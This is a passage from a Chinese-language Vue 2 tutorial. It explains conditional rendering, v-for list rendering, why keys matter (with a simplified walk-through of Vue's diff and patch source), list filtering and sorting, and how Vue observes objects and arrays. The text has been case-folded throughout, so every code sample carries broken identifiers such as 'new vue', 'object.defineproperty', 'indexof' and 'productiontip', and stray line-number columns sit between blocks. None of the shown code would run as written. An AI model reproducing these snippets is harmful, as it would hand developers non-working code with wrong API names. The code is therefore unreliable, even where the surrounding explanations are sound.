\'username\'">点击切换模式</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                logintype: \'username\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. v-if：\n    1. 写法： 1) v-if="js表达式" 2) v-else-if="js表达式" 3) v-else="js表达式"。\n    2. 适用于：切换频率较低的场景。\n    3. 特点：不展示的dom直接被删除。\n    4. 注意：v-if、v-else-if和v-else可以联合使用，但要求结构不能被“打断”。\n 2. v-show：\n    1. 写法： v-show="js表达式"。\n    2. 适用于：切换频率较高的场景。\n    3. 特点：不展示的dom未被删除，仅仅使用样式隐藏掉。\n\n----------------------------------------\n\n\n# 6.2 列表渲染\n\n我们经常使用ul-li这样的列表结构来展示一个列表，vue使用v-for指令将列表结构和列表数据组织起来。首先得注意的是v-for是写在item（例如<li>）的属性位置上的。\n\nv-for="xxx"的xxx通常是for-in的形式（for-of也可以），例如<li v-for="p in persons"></li>，这个persons是存储在data里的列表数据，而这个p是v-for语句里的形参（存储的是遍历出来的单项数据）。那么<li>标签体的内容就可以使用p这个单项数据了（用插值{{p.xxx}}的形式）。如果要使用索引index，那将p改为(p, index)，整体写下来就是v-for="(p, index) in persons"。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>人员信息列表（遍历数组）</h2>\n        <ul>\n            \x3c!-- v-for要写在单项也就是li上，其值是for-in的形式。li的标签体用p来填写（插值） --\x3e\n            <li v-for="p in persons" :key="p.id">{{p.id}}-{{p.name}}-{{p.age}}</li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                persons: [\n                    { id: \'001\', name: \'张三\', age: 18 },\n                    { id: \'002\', name: \'李四\', age: 19 },\n                    { id: \'003\', name: \'王五\', age: 20 }\n                ]\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nv-for="xxx"的xxx除了是数组以外，还可以是对象，其实还能是字符串和数值（这两个用得少）。用在对象上就是遍历对象的属性，通常是<li v-for="(value, key) in obj">，value是属性值，key是属性名；用在字符串上就是遍历字符串的字符，通常是<li v-for="(value, index) in str">，value是字符，index是索引；用在数值上就是单纯遍历数值，数值从1开始的，但索引是从0开始的。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- v-for用在对象上 --\x3e\n        <h2>汽车信息（遍历对象）</h2>\n        <ul>\n            <li v-for="(val, k) in car" :key="k">{{k}}-{{val}}</li>\n        </ul>\n        \x3c!-- v-for用在字符串上 --\x3e\n        <h2>遍历字符串hello</h2>\n        <ul>\n            <li v-for="(char, index) in str" :key="index">{{index}}-{{char}}</li>\n        </ul>\n        \x3c!-- v-for用在数值上 --\x3e\n        <h2>遍历数值5</h2>\n        <ul>\n            <li v-for="(num, index) in 5" :key="index">{{index}}-{{num}}</li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                car: { name: \'奥迪a8\', price: \'70万\', color: \'黑色\' },\n                str: \'hello\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. v-for指令用于展示列表数据。\n 2. 语法：v-for="(item, index) in xxx" :key="yyy"，item时单项数据，index是索引，xxx是列表数据，yyy是唯一标识。\n 3. v-for可遍历数组、对象、字符串、数值，后两个用得少。\n\n----------------------------------------\n\n\n# 6.3 key作用和简单diff分析\n\n前一小节例子里的:key="p.id"不要省略不写，这个key会被存放到虚拟dom里作为唯一标识来使用的，但它并不存在于真实dom里。如果给列表数据新增一条数据，重新渲染列表，vue会将新虚拟dom与旧虚拟dom进行对比，按照key来选择谁与谁对比，内容不变的直接使用已存在的真实dom来展示，内容变了的新建真实dom来展示。\n\n整个虚拟dom结构里可能就只有某局部一小块改变了，那就只更新那一小块（甚至只是文本的替换），这样重新渲染会很高效。看下面这个图，vue认为整个虚拟dom结构中只有key为004的需要新建真实dom，其他虚拟dom的内容没有变，那将对应的真实dom照搬拿来使用即可。\n\n\n\nkey绑定id不会有什么问题，而key绑定index可能会出现问题。下面这个例子，如果将新<li>添加到列表开头，表面上看没什么问题，实际上多了许多没必要的真实dom渲染；再进一步放大问题，如果<li>还包含了<input>，那输入框文本内容在重新渲染后会出现串行的问题。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>人员信息列表</h2>\n        <ul>\n            <button @click="add">新增一个老刘</button>\n            \x3c!-- 让key绑定index，看会出现什么问题 --\x3e\n            <li v-for="(p, index) in persons" :key="index">\n                {{p.name}}-{{p.age}} <input type="text">\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                persons: [\n                    { id: \'001\', name: \'张三\', age: 18 },\n                    { id: \'002\', name: \'李四\', age: 19 },\n                    { id: \'003\', name: \'王五\', age: 20 }\n                ]\n            },\n            methods: {\n                add() {\n                    // 添加新数据到列表 开头\n                    this.persons.unshift({ id: \'004\', name: \'老刘\', age: 30 });\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n\n上面的问题是主要因为index索引被重新分配了，导致key的“一一对应”已经达不到期望的那样，如下图。\n\n * “没必要的真实dom渲染”的问题，是每次的比较vue认为你每一项的text文本内容都变了（因为key对不上了，或者说对歪了），这就会让每项重新使用新虚拟dom的text真实文本，例如key为0的新虚拟dom的“老刘-30”会覆盖以前key为0的“张三-18”。\n * “输入框text会出现串行”的问题，是vue认为新旧虚拟dom的子元素input是相同的，然后拿以前input对应的真实dom来渲染展示。例如key为0的<li>的子元素input会使用以前key为0的子元素input的真实input，那就会出行“老刘-30”文本后紧跟input的输入内容是“张三-18”。\n\n\n\n你可能会疑惑“子元素input是相同的”，不是输入内容不一样吗？其实vue对input类的虚拟dom的比较，没有涉及到输入组件的value。vm._vnode.children逐层可以找到input的虚拟dom信息。可以从diff算法的源代码简单分析，没有对input类的新旧虚拟dom的value进行比对。\n\n请看下面简化的源代码。上面例子的“text文本内容”，对应下面源代码的“如果两者的text不一样，让vnode的text直接给el的text”。而上面例子的“子元素input”，对应下面源代码的“如果两者都有子节点，则执行updatechildren比较子节点”。updatechildren在多个子节点情况下很复杂，但上面例子还好比较简单，只是一个子节点input。其实最终会让samevnode去比较input的新旧虚拟dom，但是samevnode没有涉及到输入组件的value比较，会认为新旧input是相同的，所以最后会将旧虚拟dom的真实input结构直接拿过来用，这就导致input的text显示串行。\n\n// 比较新旧虚拟dom，来决定怎么更新对应的真实dom。oldvnode是旧虚拟dom，vnode是新虚拟dom\nfunction patch(oldvnode, vnode) {\n    if (samevnode(oldvnode, vnode)) { // 简单比较当前层次节点\n        patchvnode(oldvnode, vnode); // 复杂地比较子节点\n    } else { // 以下代码很多，就不贴过来了\n        // 根据新虚拟dom来生成新真实dom\n        // 有父节点，如果没有就作为根节点\n        // 1.添加 新虚拟dom 对应的 真实dom 到 父节点真实dom 里\n        // 2.从 父节点真实dom 里 移除 旧虚拟dom 对应的 真实dom\n    }\n}\n/**\n * 主要比较新旧虚拟dom的text和children（其实text属于children这个数组里的）\n * 具体代码有些复杂，无关代码也混合其中，这里用注释书写了大概的逻辑\n*/\nfunction patchvnode(oldvnode, vnode) {\n    // 因为经过samevnode的简单比较，那认为两者的当前层次的真实dom（el）保持相同\n    // 如果两者指向同一个对象，就直接return\n    // 如果两者的text不一样，让vnode的text直接给el的text\n    // 如果oldvnode有子节点而vnode没有，则删除el的子节点\n    // 如果oldvnode没有子节点而vnode有，则将vnode的子节点真实化之后添加到el\n    // 如果两者都有子节点，则执行updatechildren比较子节点，子节点很多的话就会很复杂\n}\n/**\n * 简单的比较，标签类型、data数据是否都存在、如果都是输入组件那组件类型是否相同等等\n * samevnode和sameinputtype都没有涉及到input的value比较\n*/\nfunction samevnode(a, b) {\n    return (\n        a.key === b.key &&\n        a.asyncfactory === b.asyncfactory && (\n            (\n                a.tag === b.tag &&\n                a.iscomment === b.iscomment &&\n                isdef(a.data) === isdef(b.data) &&\n                sameinputtype(a, b)\n            ) || (\n                istrue(a.isasyncplaceholder) &&\n                isundef(b.asyncfactory.error)\n            )\n        )\n    )\n}\nfunction sameinputtype(a, b) {\n    if (a.tag !== \'input\') { return true }\n    var i;\n    var typea = isdef(i = a.data) && isdef(i = i.attrs) && i.type;\n    var typeb = isdef(i = b.data) && isdef(i = i.attrs) && i.type;\n    return typea === typeb || istextinputtype(typea) && istextinputtype(typeb)\n}\nvar istextinputtype = makemap(\'text,number,password,search,email,tel,url\');\nfunction isdef(v) { return v !== undefined && v !== null }\nfunction istrue(v) { return v === true }\nfunction isundef(v) { return v === undefined || v === null }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. key是虚拟dom的唯一标识，当数据发生变化时，vue根据新数据生成新的虚拟dom，随后vue进行新虚拟dom与旧虚拟dom的差异比较。\n 2. 比较的规则：\n    1. 先简单比较新旧虚拟dom，如果直接就不相同了，就新建真实dom并舔加到对应位置；\n    2. 简单比较相同后，新旧虚拟dom共用当前层次的真实dom（el），再去比较它们的children；\n       1. 如果新旧虚拟dom的text不一样，那就让新虚拟dom的text给el的text的使用；（特殊子节点text有这条特殊规则）\n       2. 如果旧虚拟dom有子节点而新虚拟dom没有，则删除el的子节点；\n       3. 如果旧虚拟dom没有子节点而新虚拟dom有，则将新虚拟dom的子节点真实化之后添加到el；\n       4. 如果新旧虚拟dom都有子节点，则执行updatechildren比较子节点，但最终会回归到简单比较。\n 3. 用index作为key可能会引发的问题：\n    1. 若对数据进行逆序添加、逆序删除等破坏顺序的操作，会产生没有必要的真实dom更新（页面没问题，但效率低）；\n    2. 若结构中还包含输入类元素，会产生错误的dom更新（页面有问题）。\n 4. 开发中如何选择key\n    1. 最好使用每条数据的唯一标识作为key，例如id、学号等；\n    2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表作为展示，使用index是没什么大问题的。\n\n----------------------------------------\n\n\n# 6.4 列表的过滤和排序\n\n列表的过滤还是比较简单的，使用计算属性配合filter，或者使用监视属性配合filter，代码如下\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <input type="text" placeholder="请输入要搜索的关键字" v-model="keywords">\n        <ul>\n            <li v-for="(p, index) in filpersons" :key="p.id">\n                {{p.name}}-{{p.sex}}\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                keywords: \'\',\n                persons: [\n                    { id: \'001\', name: \'马冬梅\', sex: \'女\' },\n                    { id: \'002\', name: \'周冬雨\', sex: \'女\' },\n                    { id: \'003\', name: \'周杰伦\', sex: \'男\' },\n                    { id: \'004\', name: \'温兆伦\', sex: \'男\' },\n                ]\n            },\n            computed: {\n                filpersons() {\n                    return this.persons.filter((p) => {\n                        return p.name.indexof(this.keywords) !== -1;\n                    });\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <input type="text" placeholder="请输入要搜索的关键字" v-model="keywords">\n        <ul>\n            <li v-for="(p, index) in filpersons" :key="p.id">\n                {{p.name}}-{{p.sex}}\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                keywords: \'\',\n                persons: [\n                    { id: \'001\', name: \'马冬梅\', sex: \'女\' },\n                    { id: \'002\', name: \'周冬雨\', sex: \'女\' },\n                    { id: \'003\', name: \'周杰伦\', sex: \'男\' },\n                    { id: \'004\', name: \'温兆伦\', sex: \'男\' },\n                ],\n                filpersons: []\n            },\n            watch: {\n                keywords: {\n                    immediate: true,\n                    handler(val) {\n                        // return true是过滤出来\n                        this.filpersons = this.persons.filter((p) => {\n                            return p.name.indexof(val) !== -1;\n                        });\n                    }\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n列表的排序也很简单，新增一个跟排序有关的属性sorttype，为0原顺序、1升序、2降序，再在计算属性filpersons对数据列表使用sort()排序即可。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <input type="text" placeholder="请输入要搜索的关键字" v-model="keywords">\n        <button @click="sorttype = 1">升序</button>\n        <button @click="sorttype = 2">降序</button>\n        <button @click="sorttype = 0">原顺序</button>\n        <ul>\n            <li v-for="(p, index) in filpersons" :key="p.id">\n                {{p.name}}-{{p.age}}\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                keywords: \'\',\n                sorttype: 0,\n                persons: [\n                    { id: \'001\', name: \'马冬梅\', age: 30 },\n                    { id: \'002\', name: \'周冬雨\', age: 25 },\n                    { id: \'003\', name: \'周杰伦\', age: 27 },\n                    { id: \'004\', name: \'温兆伦\', age: 21 },\n                ]\n            },\n            computed: {\n                filpersons() {\n                    const arr = this.persons.filter((p) => {\n                        return p.name.indexof(this.keywords) !== -1;\n                    });\n                    if (this.sorttype) {\n                        // 升序a-b，降序b-a\n                        arr.sort((a, b) => {\n                            return this.sorttype === 1 ? a.age - b.age : b.age - a.age\n                        });\n                    }\n                    return arr;\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n\n# 七、vue的数据监视\n\n\n# 7.1 更新时的一个问题\n\n声明一点，这一章说的“监视”，与监视属性给开发人员提供的watch配置并不是同一个东西。\n\n在修改列表数据的某项时，如果修改的是某项的一些属性，那是可以被vue监视到的，并会更新到页面；而如果直接将某项这样的对象直接替换掉（使用新对象），这样是不会被vue监视到的，所以也不会更新到页面。代码如下，我们在控制台打印vm.persons[0]或vm._data.persons[0]，会发现这个对象确实被替换了，但页面没有更新。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <button @click="updatemei">更新马冬梅这一行的信息</button>\n        <ul>\n            <li v-for="(p, index) in persons" :key="p.id">\n                {{p.name}}-{{p.age}}\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                persons: [\n                    { id: \'001\', name: \'马冬梅\', age: 30 },\n                    { id: \'002\', name: \'周冬雨\', age: 25 },\n                    { id: \'003\', name: \'周杰伦\', age: 27 },\n                    { id: \'004\', name: \'温兆伦\', age: 21 },\n                ]\n            },\n            methods: {\n                updatemei() {\n                    // 页面生效了\n                    /* this.persons[0].name = \'马老师\';\n                    this.persons[0].age = 50; */\n                    // 页面没生效，但vm.persons[0]是修改了的，只是没被vue监视到\n                    this.persons[0] = { id: \'001\', name: \'马老师\', age: 50 };\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n\n# 7.2 监视的数据是对象\n\n我们想一下，怎么做到对数据属性进行监视呢？直接给属性使用object.defineproperty()的set不就行了吗？确实是在属性的setter被触发时，可以去重新渲染页面，达到监视的目的。我们可以看以下代码会出现什么问题，如果在控制台里运行data.name = \'李四\'，就会出现uncaught rangeerror: maximum call stack size exceeded这样的报错。这个报错的意思是“超出了调用栈大小”，这是因为你去改data.name会触发set，set内又改了data.name，这就陷入了一个死循环。\n\nlet data = { name: \'张三\', age: 18 };\nobject.defineproperty(data, \'name\', {\n    get() {\n        return data.name;\n    },\n    set(val) {\n        data.name = val;\n        // 对象的属性值改变，触发xxx动作，达到监视目的\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n想要优化上面的代码，非常的简单，只需要另外定义一个中间量，让getter/setter实际访问的是这个中间量即可。将以下代码复制到浏览器控制台然后回车执行，语句(2)的middle会保存语句(1)中data.name的值张三；继续在控制台里输入data.name再回车执行，会出现语句(3)的打印日志，然后就运行到语句(4)，就会读取middle的值也就是语句(2)这里存储的值张三；继续在控制台里输入data.name = \'李四\'再回车执行，会出现语句(5)的打印日志，然后就运行到语句(6)，就会修改middle的值也就是语句(2)这里存储的值变为李四。这样你不管是读取还是修改data.name，实际上都是访问的是middle，这个middle就充当了一个数据存储器。\n\nlet data = { name: \'张三\', age: 18 };                   // (1)\nlet middle = data.name;                                 // (2)\nobject.defineproperty(data, \'name\', {\n    get() {\n        console.log(\'读取name，实际上读取的是middle\');    // (3)\n        return middle;                                  // (4)\n    },\n    set(val) {\n        console.log(\'修改name，实际上修改的是middle\');    // (5)\n        middle = val;                                   // (6)\n        // 对象的属性值改变，触发xxx动作，达到监视目的\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n以上代码要完全模拟vue中的数据监视，再加上object.key()与遍历处理就可以了。我们直接看简化后的数据监视相关的源代码，你可以直接将下面的代码整体复制到浏览器控制台然后回车执行，再查看vm._data与前面章节里的vm._data是否差不多（暂时没有考虑多层级的对象，这会用到递归）。\n\n// 无关紧要的都删掉不看了\nfunction vue(options) {\n    // vm会是以后的vue实例，options就是配置对象\n    var vm = this;\n    // 暂时去掉vue的处理，先直接赋给vm.$options\n    vm.$options = options;\n    // 数据处理相关\n    initstate(vm);\n}\nfunction initstate(vm) {\n    // 处理配置对象里的 “data”存储数据\n    initdata(vm);\n}\nfunction initdata(vm) {\n    var data = vm.$options.data;\n    // 暂不考虑data是function的情况\n    vm._data = data;\n    // 本章 七、vue的数据监视 的重点 \n    observe(data, true /* asrootdata */);\n}\n// 本章 七、vue的数据监视 的重点 \nfunction observe(value, asrootdata) {\n    var ob;\n    if (hasown(value, \'__ob__\') && value.__ob__ instanceof observer) {\n        ob = value.__ob__;\n    } else {\n        ob = new observer(value);\n    }\n    return ob;\n}\nfunction hasown(obj, key) {\n    return hasownproperty.call(obj, key)\n}\nvar observer = function observer(value) {\n    this.value = value;\n    // 属性是数组形式的\n    if (array.isarray(value)) {\n        // 暂时省略，7.4 监视的数据是数组 里会说\n    } else {\n        // 属性是对象形式的\n        this.walk(value);\n    }\n};\n// 处理对象的所有属性\nobserver.prototype.walk = function walk(obj) {\n    var keys = object.keys(obj);\n    for (var i = 0; i < keys.length; i++) {\n        definereactive$$1(obj, keys[i]);\n    }\n};\n// 本章 七、vue的数据监视 的核心，为属性做响应式处理。不过多层级的对象暂时没有考虑\nfunction definereactive$$1(obj, key, val, customsetter, shallow) {\n    // 读取obj对象里key属性的特性\n    var property = object.getownpropertydescriptor(obj, key);\n    if (property && property.configurable === false) return\n    var getter = property && property.get;\n    var setter = property && property.set;\n    // val是重点，下面的getter和setter最后都是访问的val，它是中间量\n    if ((!getter || setter) && arguments.length === 2) {\n        val = obj[key];\n    }\n    // 多层级的对象暂时不考虑，这个会用到递归\n    // var childob = !shallow && observe(val);\n    // 修改obj对象里key属性的特性\n    object.defineproperty(obj, key, {\n        enumerable: true,\n        configurable: true,\n        get: function reactivegetter() {\n            return getter ? getter.call(obj) : val;\n        },\n        set: function reactivesetter(newval) {\n            setter ? setter.call(obj, newval) : (val = newval);\n            /*\n                dep.notify();通知所有订阅者，订阅者会调用patch。\n                patch有在[6.3 key作用和简单diff分析]这节里说，\n                是比较新旧虚拟dom，然后决定如果更新真实dom\n            */\n            // dep.notify();\n            console.log(\'去重新渲染页面\');\n        }\n    });\n}\nvar vm = new vue({\n    el: \'#root\',\n    data: {\n        name: \'张三\'\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n\n\n\n# 7.3 vue.set()\n\n可能会遇到这样一个需求，在存储数据中追加一个新属性，这个新属性在当时的配置对象的data里没有定义过。vue给我么提供了vue.set(target, key, value)和vm.$set(target, key, value)来实现这样的数据，这两个方法的参数列表都是一样的，target表示你要往哪个对象里添加，key是新属性名，value是新属性值。可以看下面的代码。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>姓名：{{person.name}}</h2>\n        <h2>性别：{{person.sex}}</h2>\n        <h2>年龄：{{person.age}}</h2>\n        <h2>爱好：{{person.hobby}}</h2>\n        <h2>学校：{{person.school}}</h2>\n        <button @click="addproperty">追加新属性</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                person: { name: \'张三\' }\n            },\n            methods: {\n                addproperty() {\n                    vue.set(this._data.person, \'sex\', \'男\');\n                    this.$set(this._data.person, \'age\', 18);\n                    vue.set(this.person, \'hobby\', \'打球\');\n                    this.$set(this.person, \'school\', \'武汉大学\');\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n上面的例子，在点击按钮后，页面上会出现新的展示信息，在浏览器控制台也可以检查到vm和vm._data里都有出现对应的新属性（可以直接加到vm上，因为有数据代理的关系）。然后vue.set()和vm.$set()会有一个限制，这两个方法的第一个参数target，必须是存储数据中已存在的属性，不能是vm（vue实例）也不能是vm._data（vue实例根数据对象）。上面例子的target就是this._data.person已存在的属性。\n\n\n# 7.4 监视的数据是数组\n\n在前面说的数据监视，说的是对象类型的，没有提到数组类型的。下面是简化的源代码，对数组的每一项的本身并没有进行监视，但是会递归每一项，递归到的数据是对象，就会对这个对象的所有属性进行监视（就回到7.2 监视的数据是对象了）；递归到的是数组就继续递归，直至完毕。\n\nvar observer = function observer(value) {\n    this.value = value;\n    // 属性是数组形式的\n    if (array.isarray(value)) {\n        if (hasproto) {\n            protoaugment(value, arraymethods);\n        } else {\n            copyaugment(value, arraymethods, arraykeys);\n        }\n        // 对数组每一项进行observe递归\n        this.observearray(value);\n    } else {\n        // 属性是对象形式的\n        this.walk(value);\n    }\n};\n/**\n * walk()里是调用了definereactive$$1()\n * 而observearray()是直接调用了observe()，递归了\n * 表达的意思是，对数组的每一项不进行监视，但对每一项里的所有属性进行observe递归，\n * 直到该项数据不是数组，就可以使用definereactive$$1()进行监视了。\n*/\nobserver.prototype.observearray = function observearray(items) {\n    for (var i = 0, l = items.length; i < l; i++) {\n        observe(items[i]);\n    }\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n因为对数组每一项没有进行监视，所以你完全替换掉某一项，页面是不会进行重新渲染的，这在7.1 更新时的一个问题里出现过。但是，对数组进行push()、pop()、shift()、unshift()、splice()、sort()、reverse()这些操作，会被vue监视到。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <button @click="deleteitem">删除最后一项</button>\n        <ul>\n            <li v-for="(p, index) in persons" :key="p.id">\n                {{p.name}}-{{p.age}}\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                persons: [\n                    { id: \'001\', name: \'马冬梅\', age: 30 },\n                    { id: \'002\', name: \'周冬雨\', age: 25 },\n                    { id: \'003\', name: \'周杰伦\', age: 27 },\n                    { id: \'004\', name: \'温兆伦\', age: 21 },\n                ]\n            },\n            methods: {\n                deleteitem() {\n                    // 页面生效了\n                    !!this.persons.length && this.persons.pop();\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n我们可以看到这一小节一开始的简化源代码里的protoaugment(value, arraymethods);和copyaugment(value, arraymethods, arraykeys);，其中这个arraymethods就是关键所在，vue对数组的那7个方法进行了包裹，可以大概了解一下下面的源代码，在开发人员使用数组的这些方法时，vue最终会走notify()去重新渲染页面。\n\nvar arrayproto = array.prototype;\nvar arraymethods = object.create(arrayproto);\nvar methodstopatch = [\'push\', \'pop\', \'shift\', \'unshift\', \'splice\', \'sort\', \'reverse\' ];\n\nmethodstopatch.foreach(function (method) {\n    // cache original method\n    var original = arrayproto[method];\n    def(arraymethods, method, function mutator() {\n        var args = [], len = arguments.length;\n        while (len--) args[len] = arguments[len];\n\n        var result = original.apply(this, args);\n        var ob = this.__ob__;\n        var inserted;\n        switch (method) {\n            case \'push\':\n            case \'unshift\':\n                inserted = args;\n                break\n            case \'splice\':\n                inserted = args.slice(2);\n                break\n        }\n        if (inserted) { ob.observearray(inserted); }\n        // notify change\n        ob.dep.notify();\n        return result\n    });\n});\nfunction def(obj, key, val, enumerable) {\n    object.defineproperty(obj, key, {\n        value: val,\n        enumerable: !!enumerable,\n        writable: true,\n        configurable: true\n    });\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. vue会监视data中所有层次的数据（数组每项有些特殊）。\n 2. vue通过setter实现监视，且要在vue实例化时传入配置对象，配置对象包含data。\n    1. 对象中追加的属性，vue默认不做响应式处理；\n    2. 若要给追加的属性做响应式处理，请使用vue.set()或vm.$set()。\n 3. vue对数组进行监视比较特殊，对数组本身这个引用（属于对象的某个属性）是做了监视，而对数组里每一项的本身没有做监视。然后对数组的7个常用方法做了监视。\n    1. 